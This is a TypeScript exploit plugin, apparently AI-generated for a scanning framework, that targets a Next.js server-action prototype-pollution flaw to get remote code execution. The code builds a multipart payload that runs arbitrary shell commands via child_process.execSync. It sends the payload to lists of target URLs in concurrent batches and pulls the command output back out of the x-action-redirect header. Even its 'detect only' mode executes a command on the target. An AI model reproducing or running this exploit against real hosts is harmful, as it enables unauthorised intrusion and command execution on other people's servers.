/**
 * @plugin Next.js exp
 * @name Next.js_exp
 * @version 1.0.0
 * @author AI Generated
 * @category exploit
 * @default_severity critical
 * @tags ai-generated, agent
 * @description 请把如下漏洞POC生成漏洞利用插件
 */

/**
 * Next.js Prototype Pollution RCE 漏洞利用插件
 * 
 * 漏洞描述: Next.js 特定版本中存在原型污染漏洞，结合特定payload可导致远程代码执行
 * 影响版本: Next.js 特定版本（基于特定配置）
 * 漏洞类型: 原型污染 + RCE
 * CVE: 待分配
 * 
 * 此插件用于检测和利用 Next.js 原型污染漏洞，通过构造特定的multipart/form-data请求
 * 触发原型污染并执行任意命令
 */

interface ToolInput {
    /**
     * 目标URL列表
     */
    targets: string[];
    /**
     * 要执行的命令（可选，默认为'id'）
     */
    command?: string;
    /**
     * 请求超时时间（毫秒，默认5000）
     */
    timeout?: number;
    /**
     * 是否只检测不执行命令（默认false）
     */
    detectOnly?: boolean;
    /**
     * 并发数（默认10）
     */
    concurrency?: number;
}

interface ToolOutput {
    success: boolean;
    data?: {
        /**
         * 扫描结果数组
         */
        results: Array<{
            url: string;
            vulnerable: boolean;
            commandOutput?: string;
            error?: string;
            responseTime?: number;
        }>;
        /**
         * 统计信息
         */
        summary: {
            total: number;
            vulnerable: number;
            scanned: number;
            failed: number;
        };
    };
    error?: string;
}

/**
 * 生成漏洞利用payload
 * @param command 要执行的命令
 * @returns 包含payload的multipart/form-data请求体
 */
function generateExploitPayload(command: string): string {
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    
    // 编码命令，确保在URL中安全传输
    const encodedCommand = encodeURIComponent(command);
    
    const payload = {
        then: "$1:__proto__:then",
        status: "resolved_model",
        reason: -1,
        value: '{"then":"$B1337"}',
        _response: {
            _prefix: `var res=process.mainModule.require('child_process').execSync('${command}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`,
            _chunks: "$Q2",
            _formData: {
                get: "$1:constructor:constructor"
            }
        }
    };

    const parts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        JSON.stringify(payload),
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ];

    return parts.join('\r\n');
}

/**
 * 生成检测payload（不执行命令）
 * @returns 包含无害检测payload的multipart/form-data请求体
 */
function generateDetectionPayload(): string {
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    
    const payload = {
        then: "$1:__proto__:then",
        status: "resolved_model",
        reason: -1,
        value: '{"then":"$B1337"}',
        _response: {
            _prefix: "var res='VULNERABLE_DETECTED';throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
            _chunks: "$Q2",
            _formData: {
                get: "$1:constructor:constructor"
            }
        }
    };

    const parts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        JSON.stringify(payload),
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ];

    return parts.join('\r\n');
}

/**
 * 从响应头 x-action-redirect 中解析命令输出
 * @param redirectHeader x-action-redirect 头的值
 * @returns 提取的命令输出或null
 */
function parseRedirectHeader(redirectHeader: string | null): string | null {
    if (!redirectHeader) return null;
    
    try {
        // 格式: /login?a=uid=1001(nextjs) gid=65534(nogroup)...;push
        // 或: /login?a=VULNERABLE_DETECTED;307;
        const match = redirectHeader.match(/\/login\?a=([^;]+)/);
        if (match && match[1]) {
            return decodeURIComponent(match[1].trim());
        }
        return null;
    } catch (error) {
        return null;
    }
}

/**
 * 解析响应，提取命令执行结果
 * @param responseText 响应文本
 * @param redirectHeader x-action-redirect 响应头
 * @returns 提取的命令输出或null
 */
function parseCommandOutput(responseText: string, redirectHeader: string | null): string | null {
    // 优先从响应头解析（更可靠）
    const headerResult = parseRedirectHeader(redirectHeader);
    if (headerResult) {
        return headerResult;
    }
    
    try {
        // 备用：从响应体中提取
        const redirectMatch = responseText.match(/NEXT_REDIRECT;push;\/login\?a=([^;]+);307/);
        if (redirectMatch && redirectMatch[1]) {
            return decodeURIComponent(redirectMatch[1]);
        }
        
        const errorMatch = responseText.match(/digest:\s*['"]NEXT_REDIRECT;push;\/login\?a=([^'"]+)['"]/);
        if (errorMatch && errorMatch[1]) {
            return decodeURIComponent(errorMatch[1]);
        }
        
        if (responseText.includes('VULNERABLE_DETECTED')) {
            return "VULNERABLE_DETECTED";
        }
        
        return null;
    } catch (error) {
        return null;
    }
}

/**
 * 检测命令输出是否表明漏洞利用成功
 * @param output 命令输出
 * @param command 执行的命令
 * @returns 是否利用成功
 */
function isExploitSuccessful(output: string | null, command: string): boolean {
    if (!output) return false;
    
    // id 命令特征检测
    if (command === 'id' || command.includes('id')) {
        return /uid=\d+/.test(output) || /gid=\d+/.test(output);
    }
    
    // whoami 命令特征
    if (command === 'whoami') {
        return output.length > 0 && !output.includes('error') && !output.includes('not found');
    }
    
    // 通用检测：有输出且不是错误信息
    return output.length > 0 && 
           output !== "VULNERABLE_DETECTED" &&
           !output.toLowerCase().includes('error') &&
           !output.toLowerCase().includes('not found');
}

/**
 * 发送漏洞利用请求
 * @param url 目标URL
 * @param payload 请求体payload
 * @param timeout 请求超时时间
 * @returns 请求结果
 */
async function sendExploitRequest(
    url: string, 
    payload: string, 
    timeout: number
): Promise<{responseText: string; status: number; responseTime: number; redirectHeader: string | null; error?: string}> {
    const startTime = Date.now();
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Host': new URL(url).host,
                'Next-Action': 'x',
                'X-Nextjs-Request-Id': 'b5dce965',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad',
                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
                'Content-Length': payload.length.toString(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: payload,
            timeout: timeout
        });
        
        const responseTime = Date.now() - startTime;
        const responseText = await response.text();
        
        // 获取关键响应头 x-action-redirect
        const redirectHeader = response.headers.get('x-action-redirect');
        
        return {
            responseText,
            status: response.status,
            responseTime,
            redirectHeader
        };
    } catch (error: any) {
        const responseTime = Date.now() - startTime;
        return {
            responseText: '',
            status: 0,
            responseTime,
            redirectHeader: null,
            error: error.message || 'Request failed'
        };
    }
}

/**
 * 规范化URL，如果没有协议则返回需要检测的URL列表
 * @param target 目标地址
 * @returns 需要检测的URL列表
 */
function normalizeTargetUrls(target: string): string[] {
    const trimmed = target.trim();
    
    // 已有协议，直接返回
    if (trimmed.startsWith('http://') || trimmed.startsWith('https://')) {
        return [trimmed];
    }
    
    // 没有协议，同时检测 https 和 http
    return [`https://${trimmed}`, `http://${trimmed}`];
}

/**
 * 简单的并发批量执行器
 * @param tasks 任务函数数组
 * @param batchSize 每批并发数
 */
async function runInBatches<T>(
    tasks: (() => Promise<T>)[],
    batchSize: number
): Promise<void> {
    for (let i = 0; i < tasks.length; i += batchSize) {
        const batch = tasks.slice(i, i + batchSize);
        await Promise.all(batch.map(task => task().catch(() => {})));
    }
}

/**
 * 主分析函数
 */
export async function analyze(input: ToolInput): Promise<ToolOutput> {
    try {
        // 验证输入
        if (!input || !input.targets || !Array.isArray(input.targets) || input.targets.length === 0) {
            return {
                success: false,
                error: "无效输入: targets 参数是必需的且必须是非空数组"
            };
        }

        const targets = input.targets;
        const command = input.command || 'id';
        const timeout = input.timeout || 5000;
        const detectOnly = input.detectOnly || false;
        const concurrency = input.concurrency || 5; // 默认并发5，避免内存问题
        
        const results: Array<{
            url: string;
            vulnerable: boolean;
            commandOutput?: string;
            responseTime?: number;
        }> = [];

        let scannedCount = 0;
        
        // 单个目标的扫描任务
        const scanTarget = async (target: string): Promise<void> => {
            const urlsToTest = normalizeTargetUrls(target);
            
            for (const targetUrl of urlsToTest) {
            try {
                // 验证URL格式
                try {
                        new URL(targetUrl);
                } catch {
                    continue;
                }

                    scannedCount++;
                
                    const effectiveCommand = detectOnly ? 'id' : command;
                    const payload = generateExploitPayload(effectiveCommand);
                const requestResult = await sendExploitRequest(targetUrl, payload, timeout);
                
                if (requestResult.error) {
                    continue;
                }

                    const commandOutput = parseCommandOutput(requestResult.responseText, requestResult.redirectHeader);
                
                if (detectOnly) {
                        const vulnerable = isExploitSuccessful(commandOutput, 'id');
                        if (vulnerable) {
                    results.push({
                        url: targetUrl,
                                vulnerable: true,
                                commandOutput: `漏洞存在! 命令输出: ${commandOutput}`,
                        responseTime: requestResult.responseTime
                    });
                            return; // 找到漏洞，跳过其他协议
                        }
                } else {
                        const vulnerable = isExploitSuccessful(commandOutput, command);
                        if (vulnerable) {
                    results.push({
                        url: targetUrl,
                                vulnerable: true,
                                commandOutput: commandOutput,
                        responseTime: requestResult.responseTime
                    });
                            return; // 找到漏洞，跳过其他协议
                        }
                    }
                } catch {
                    continue;
                }
            }
        };

        // 创建所有扫描任务
        const tasks = targets.map(target => () => scanTarget(target));
        
        // 分批并发执行
        await runInBatches(tasks, concurrency);

        // 生成统计信息
        const summary = {
            total: targets.length,
            vulnerable: results.length,
            scanned: scannedCount,
            concurrency: concurrency
        };

        return {
            success: true,
            data: {
                results,
                summary
            }
        };

    } catch (error: any) {
        return {
            success: false,
            error: error instanceof Error ? error.message : String(error)
        };
    }
}

// **关键**: 必须将函数导出到 globalThis 以供插件引擎调用
// 没有这个导出，插件将失败并显示"找不到函数"错误
globalThis.analyze = analyze;